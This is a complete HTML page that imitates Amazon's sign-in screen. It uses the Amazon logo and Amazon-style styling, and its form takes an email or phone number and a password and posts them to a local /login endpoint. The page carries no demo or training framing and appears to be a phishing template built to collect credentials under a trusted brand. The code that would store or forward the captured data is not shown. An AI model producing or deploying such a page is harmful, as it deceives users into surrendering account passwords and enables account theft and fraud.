<!DOCTYPE html>
<html>
<head>
    <title>Amazon Sign-In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; text-align: center; }
        .box { width: 300px; margin: auto; border: 1px solid #ddd; padding: 20px; border-radius: 5px; margin-top: 50px; }
        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; }
        button { width: 95%; background: #f0c14b; border: 1px solid #a88734; padding: 10px; cursor: pointer; }
    </style>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" width="100">
    <div class="box">
        <h2>Sign-In</h2>
        <form action="/login" method="POST">
            <input type="text" name="email" placeholder="Email or phone" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit">Continue</button>
        </form>
    </div>
</body>
</html>
